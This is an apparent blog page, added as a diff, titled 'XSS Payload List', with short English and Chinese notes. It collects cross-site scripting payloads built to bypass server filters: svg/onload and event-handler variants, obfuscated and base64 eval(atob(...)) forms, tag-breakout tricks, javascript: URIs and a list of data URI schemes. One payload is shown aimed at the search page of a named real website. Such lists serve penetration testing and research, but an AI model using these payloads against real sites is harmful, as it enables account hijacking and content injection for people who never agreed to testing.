@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="pt">
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <title>XSS Payload List | 3ecurity</title>
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="/css/bootstrap-3.3.6/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/css/main.css">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-137778587-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-137778587-1');
+</script>
+
+
+
+    <link rel="shortcut icon" href="/images/favicon.jpg">
+
+    <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed/"> 
+
+</head>
+
+
+    <body>
+      <div class="container">
+
+        
+
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2">
+            <main>
+            <div class="post">
+
+  <header class="post-header">
+    <h1>XSS Payload List</h1>
+  </header>
+
+  <article class="post-content">
+  <div class="post">
+
+  <header class="post-header">
+    <p class="meta">
+        Apr 14, 2019
+        
+        
+        •
+        <span><a href="/category/#XSS" class="reserved">XSS</a>,</span><span><a href="/category/#Payload" class="reserved">Payload</a></span>
+    </p>
+  </header>
+
+  <article class="post-content">
+  <p>Assume, the server filter ) and you want to bypass it then use:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;svg/onload="-alert(1)/**/"&gt;
+</code></pre></div></div>
+<p>还可以在alert前面添加<code class="highlighter-rouge">+</code>、<code class="highlighter-rouge">%0A</code>、<code class="highlighter-rouge">%0B</code>、<code class="highlighter-rouge">%0C</code>、<code class="highlighter-rouge">%0D</code>来进行绕过。
+<br />如果是反射型XSS，可以使用上述字符进行测试，如果是存储型XSS，使用<code class="highlighter-rouge">-</code>、<code class="highlighter-rouge">+</code>、来进行绕过。
+<br />在html中并不是所有标签都需要闭合的，如<code class="highlighter-rouge">&lt;svg onload=alert(1)</code>也是可以使用的。
+<br />
+<code class="highlighter-rouge">+</code>号可以插入多个。</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"-alert`1`,"
+</code></pre></div></div>
+<p>E.g</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>window.location.replace("http://site.com?x=3site.com/?x=3 "); 
+window.location.replace("http://site.com?x=3site.com/?x=3 "-alert`1`,") 
+</code></pre></div></div>
+
+<p>will do the trick.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;b"/onauxclick='-alert(1);'&gt;Copy Me
+</code></pre></div></div>
+<p>XXS The payload will run in all the context. Eg - <br /></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;input type="text" value="&lt;b"/onauxclick='-alert(2);'&gt;XXS"&gt;
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt; var test='&lt;b"/onauxclick='-alert(3);'&gt;TEST'; &lt;/script&gt;
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;d3"👉😎👈/onclick="1&gt;[confirm`xss`]"&lt;"😎&gt;
+</code></pre></div></div>
+<p>E.g</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://dramaonline.pk/search.php?q=&lt;/title&gt;&lt;d3"👉😎👈/onclick="1&gt;[confirm`xss`]"&lt;"😎&gt;
+</code></pre></div></div>
+<p>xmp</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;xmp&gt;&lt;p title="&lt;/xmp&gt;&lt;svg/onload=alert(45)&gt;”&gt;
+</code></pre></div></div>
+<p>noscript</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;noscript&gt;&lt;p title="&lt;/noscript&gt;&lt;svg/onload=alert(45)&gt;”&gt;
+</code></pre></div></div>
+<p>noframes</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;noframes&gt;&lt;p title="&lt;/noframes&gt;&lt;svg/onload=alert(45)&gt;”&gt;
+</code></pre></div></div>
+<p>iframe</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe&gt;&lt;p title="&lt;/iframe&gt;&lt;svg/onload=alert(45)&gt;"&gt;
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code></code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;--`&lt;img/src=` onerror=confirm`xss`&gt; --!&gt; 
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;--&lt;img onerror=alert(1) src=a&gt; --!&gt;
+&lt;--%253cimg%20onerror=alert(1)%20src=a%253e --!&gt;
+</code></pre></div></div>
+<p>Data URI scheme</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>data:
+data:text/plain
+data:text/html
+data:text/html;base64
+data:text/css
+data:text/css;base64
+data:text/javascript
+data:text/javascript;base64
+data:image/gif;base64
+data:image/png;base64
+data:image/jpeg;base64
+data:image/x-icon;base64
+</code></pre></div></div>
+<p>working IE/EDGE XSS payload</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"&gt;&lt;script&gt;co\u006efir\u006d`1`&lt;/script&gt;
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;svg onload=1?alert(9):0&gt;
+&lt;svg onload=0?1:alert(9)&gt;
+</code></pre></div></div>
+<p>AutoFocus后面的<code class="highlighter-rouge">*/;</code>会被解析为<code class="highlighter-rouge">*</code>属性、<code class="highlighter-rouge">;</code>属性。所以这里还可以加上任意字符<code class="highlighter-rouge">a/b/c/</code>、<code class="highlighter-rouge">confirm</code>也可以使用<code class="highlighter-rouge">\u</code>进行编码。</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hello&lt;!'/*!"/*!\'/*\"/*--!&gt;&lt;Input/Type=Text AutoFocus */; OnFocus=(confirm)(document.domain) //&gt;&lt;Svg&gt;#
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe src=jaVaScrIpT:eval(atob('Y29uZmlybShkb2N1bWVudC5kb21haW4pOw=='))&gt;
+&lt;sVg/oNloAd="JaVaScRiPt:/**/eval(atob('Y29uZmlybShkb2N1bWVudC5kb21haW4pOw=='))"&gt;
+&lt;sVG/ aa */(/ oNloAd="JaVaScRiPt:/**/eval(atob('Y29uZmlybShkb2N1bWVudC5kb21haW4pOw=='))"&gt;
+&lt;sVG/ aa */(/ oNloAd="JaVaScRiPt:/**/eval(atob('Y29uZ mly bShkb2N1b WVudC5 kb21haW4 pOw = = '))"&gt;
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"javascript:"</span><span class="err">/*'/*`/*</span><span class="na">--</span><span class="nt">&gt;&lt;html</span> <span class="err">\"</span> <span class="na">onmouseover=</span><span class="s">/*&amp;lt;svg/*/onload=alert(/xss/)//</span><span class="nt">&gt;</span>
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"javascript://comment%0a%0dalert(/xss/);"</span><span class="nt">&gt;</span> Click Me<span class="nt">&lt;/a&gt;</span>
+</code></pre></div></div>
+
+
+  </article>
+</div>
+
+  </article>
+
+</div>
+
+            </main>
+          </div>
+	</div>
+	</div>
+    </body>
+</html>
